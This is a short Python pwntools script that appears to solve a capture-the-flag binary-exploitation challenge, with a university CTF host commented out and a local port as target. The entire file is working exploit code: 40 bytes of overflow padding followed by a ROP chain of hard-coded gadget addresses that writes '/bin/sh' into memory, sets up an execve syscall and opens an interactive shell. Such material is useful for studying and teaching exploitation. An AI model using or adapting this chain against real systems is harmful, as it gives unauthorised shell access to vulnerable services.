from pwn import *

r = remote("127.0.0.1", 8887)
#r = remote("ctf.adl.csie.ncu.edu.tw", 11005)
context.arch = "amd64"

r.recvuntil(".\n")
payload = "a" * 40

pop_rdi = 0x0000000000401693
pop_rdx = 0x00000000004371d5
pop_rdx_rsi = 0x00000000004371f9
mov_qptr_rdi_rdx = 0x0000000000400aba
pop_rax = 0x000000000046b408
syscall = 0x000000000045b4c5
buf = 0x6c0060

raw_input('data')

payload += flat([pop_rdi, buf, pop_rdx_rsi, "/bin/sh\x00", 0, mov_qptr_rdi_rdx, pop_rdx, 0, pop_rax, 0x3b, syscall])
r.sendline(payload)

r.interactive()

